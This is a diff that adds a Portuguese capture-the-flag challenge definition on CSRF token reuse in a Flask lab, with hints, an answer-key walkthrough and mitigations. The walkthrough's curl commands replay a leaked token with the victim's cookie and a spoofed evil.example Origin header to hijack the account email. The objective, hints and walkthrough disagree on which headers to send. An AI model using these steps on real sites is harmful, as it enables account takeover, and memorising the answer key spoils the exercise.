@@ -1,0 +1,82 @@
+{
+  "slug": "adv-csrf-token-reuse",
+  "title": "Um token que qualquer um pode usar",
+  "codename": "GRAYTIDE",
+  "summary": "Os tokens anti-CSRF da Graytide são desvinculados, nunca expiram e são publicados na página pública de press kit. Um request de outro site que carregue qualquer token reconhecido altera o e-mail de notificação da vítima e coloca a flag no registro da conta.",
+  "category": "advanced",
+  "difficulty": "medium",
+  "kind": "challenge",
+  "lab_dir": "adv-csrf-token-reuse",
+  "estimated_minutes": 20,
+  "xp": 220,
+  "tech": [
+    "Flask",
+    "Cookies",
+    "CSRF tokens",
+    "HTTP"
+  ],
+  "tags": [
+    "csrf",
+    "token-reuse",
+    "double-submit",
+    "state-changing-request"
+  ],
+  "story": "A Graytide permite que qualquer visitante anônimo pré-visualize seu press kit. Para manter consistente o formulário de contato da pré-visualização, a página também entrega o form token que emite aos browsers. O token store é um pool global: um token é aceito quando o serviço o reconhece, não quando ele pertence à sessão que o envia. O formulário de configurações da conta nunca verifica desonde veio o request.",
+  "objective": "Capture um form token da página pública de pré-visualização em uma sessão, reenvi-o em um request `/change-email` contra outra sessão autenticada sem Origin nem Referer e leia a flag que a alteração aceita grava na conta da vítima.",
+  "rules": "Permaneça na origem loopback atribuída. Duas sessions de browser no mesmo lab são permitidas; nenhum host externo é contatado.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag da conta sequestrada",
+      "flag_type": "user",
+      "points": 220,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Onde os tokens vivem?",
+      "body": "`GET /preview` renderiza um `form-token` para visitantes anônimos. Compare-o com o valor `csrf` no campo oculto de `/account`. São strings diferentes, mas ambos são aceitos.",
+      "cost": 15
+    },
+    {
+      "level": 2,
+      "title": "O token é a única verificação",
+      "body": "`POST /change-email` exige um cookie de sessão da conta alvo, mas o token é aceito do formulário, do header `X-CSRF-Token` ou de um cookie `csrf`. Nada o vincula ao cookie `sid`, então um token capturado em um browser funciona em outro.",
+      "cost": 20
+    },
+    {
+      "level": 3,
+      "title": "Faça cross-site",
+      "body": "Com a vítima autenticada, faça POST em `/change-email` de `csrf=<token de /preview>&email=<qualquer coisa contendo a flag>` com `Origin: https://evil.example` e sem `Referer`. O redirect cai em `msg=changed`, e o novo endereço (contendo a flag) é renderizado em `/account` e retornado por `/api/session`.",
+      "cost": 25
+    }
+  ],
+  "solution": {
+    "walkthrough": "**Passo 1 — autentique duas vezes.** Abra dois clientes contra a origem do lab. Autentique o cliente A como `quinn@acme.test` (vítima). Autentique o cliente B com qualquer outro endereço (atacante). Ambos recebem um cookie `sid` httpOnly.\n\n**Passo 2 — capture um token estrangeiro da página pública.**\n\n```bash\ncurl -s http://127.0.0.1:PORT/preview | grep -o 'csrf_[A-Za-z0-9_-]*'\n# csrf_NIC9iVaZVT_dWGA07pLFPA6R     (sem session necessária)\n```\n\n**Passo 3 — confirme que o token não está vinculado a quem o emitiu.** O `/account` do atacante mostra um token diferente:\n\n```bash\ncurl -s -b attacker.jar http://127.0.0.1:PORT/account | grep -o 'name=\"csrf\" value=\"[^\"]*\"'\n# csrf_u-OM13lKLsxXoRSRDlTpOuJV\n```\n\n**Passo 4 — envie o request cross-site com o cookie da vítima.**\n\n```bash\ncurl -si -b victim.jar -X POST http://127.0.0.1:PORT/change-email \\\n  -H 'Origin: https://evil.example' \\\n  -H 'Referer: https://evil.example/attack.html' \\\n  -d 'csrf=csrf_NIC9iVaZVT_dWGA07pLFPA6R&email=captured%2BRV%7B...%7D%40evil.example'\n# 302 Location: /account?msg=changed\n```\n\nUm valor aleatório como `csrf_nope` é rejeitado (`msg=bad-token`), o que prova que a falha é reuso de token e não uma verificação ausente.\n\n**Passo 5 — leia a flag.**\n\n```bash\ncurl -s -b victim.jar http://127.0.0.1:PORT/api/session\n# {\"authenticated\": true, \"email\": \"captured+RV{...}@evil.example\", ...}\n```\n\nO endereço também é renderizado em `/account` e listado em `/callback-log`.",
+    "root_cause": "O serviço valida a presença de um token que reconhece, em vez de validar um token vinculado à sessão do chamador. Os tokens nunca expiram, vivem em um pool global, vazam em uma página pública e são aceitos de um cookie ou header além do formulário. Como o endpoint só precisa do cookie de sessão para identificar a conta, um atacante consegue parear o próprio token roubado com o cookie da vítima e realizar a alteração a partir de qualquer origem.",
+    "mitigation": "Gere um token aleatório por sessão (ou por formulário), armazene-o no servidor associado ao ID de sessão, compare-o em tempo constante e expire-o após o uso. Rejeite tokens emitidos para outra sessão. Não renderize tokens de ação válidos em páginas anônimas. Valide `Origin`/`Referer` em requests que alteram estado, mantenha o cookie de sessão `SameSite=Lax` ou mais estrito e exija a senha atual ou uma etapa de reautenticação para alterações de e-mail."
+  },
+  "references": [
+    {
+      "title": "OWASP — Cross-Site Request Forgery Prevention Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Synchronizer tokens, vinculação à sessão e fragilidades do double-submit."
+    },
+    {
+      "title": "PortSwigger — CSRF vulnerabilities",
+      "url": "https://portswigger.net/web-security/csrf",
+      "source_type": "official",
+      "description": "Falhas de validação de token e padrões de bypass para tokens anti-CSRF."
+    },
+    {
+      "title": "CWE-352 — Cross-Site Request Forgery",
+      "url": "https://cwe.mitre.org/data/definitions/352.html",
+      "source_type": "standard",
+      "description": "Definição da fraqueza que cobre tokens anti-CSRF desvinculados."
+    }
+  ]
+}
